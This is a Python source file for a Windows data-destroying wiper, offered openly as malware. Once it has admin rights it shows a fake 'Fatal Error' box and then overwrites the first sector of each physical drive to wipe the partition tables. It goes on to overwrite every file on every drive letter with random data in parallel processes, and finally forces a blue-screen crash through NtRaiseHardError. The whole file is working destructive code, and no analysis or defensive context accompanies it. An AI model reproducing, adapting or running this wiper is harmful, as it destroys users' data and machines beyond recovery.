import os
import sys
import wmi
import ctypes
import multiprocessing
from win32file import *
from random import *
from time import sleep

# check if elevated

if not ctypes.windll.shell32.IsUserAnAdmin():
    sleep(5)
    sys.exit() # needs admin to do what it needs to do

def safeguard():
    ctypes.windll.user32.MessageBoxW(0, "System will now terminate. ", "Fatal Error", 0x00000000 | 0x00000010)

def partkill():
    count = 0

    for x in wmi.WMI().Win32_LogicalDisk():
            try:
                hDevice = CreateFileW(f"\\\\.\\PhysicalDrive{count}", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0, 0)
            except:
                count += 1
                pass
            try:
                WriteFile(hDevice, AllocateReadBuffer(512), None)
            except:
                pass 
            CloseHandle(hDevice)
            count += 1

# partitions are gone, now corrupt every file to make recovery harder

def search_files(directory):
    for dirpath, dirnames, filenames in os.walk(f"{directory}:\\"):
        try:
            if dirpath.lower() == r'c:\windows\servicing': # dont know whats inside this folder but it increases the time taken by a lot
                dirnames[:] = []                           # so im just going to ignore this folder
                continue
            for filename in filenames:
                try:
                    yield os.path.join(dirpath, filename)
                except:
                    None #interrupted
        except:
            None #interrupted

def erase(path, passes, chunk_size=268435456, max_file_size=1073741824):
    length = os.path.getsize(path)
    with open(path, "br+", buffering=-1) as f:
        for _ in range(passes):
            f.seek(0)
            if length > max_file_size:
                num_chunks = length // chunk_size
                remainder = length % chunk_size

                for _ in range(num_chunks):
                    f.write(os.urandom(chunk_size))

                if remainder > 0:
                    f.write(os.urandom(remainder))
            else:
                f.write(os.urandom(length))
            f.close()

def erase_file(file):
    try:
        erase(file, 1)
    except:
        pass

drive_letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"[::-1]

if __name__ == '__main__': # safeguard to prevent other processes from looping back into the same code - apparently breaks this program
    message_box_process = multiprocessing.Process(target=safeguard)
    message_box_process.start()
    message_box_process.join() # if u ran this on host by accident just unplug ur pc instead of clicking the msgbox

    part = multiprocessing.Process(target=partkill) # stinky
    part.start()
    part.join()

    num_processes = multiprocessing.cpu_count()
    pool = multiprocessing.Pool(processes=num_processes) 

    # wiper payloadd
    for char in drive_letters:
        directory = char  
        for file in search_files(directory):
            try:
                pool.apply_async(erase_file, (file,)) 
            except:
                None # interrupted (i.e by ctrl-alt-del)
    pool.close()
    pool.join() # wait until all files are damaged

    # bsod after corrupting every file

    ntdll = ctypes.windll.ntdll
    prev_value = ctypes.c_bool()
    res = ctypes.c_ulong()
    ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
    if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
        None
    else:
        None
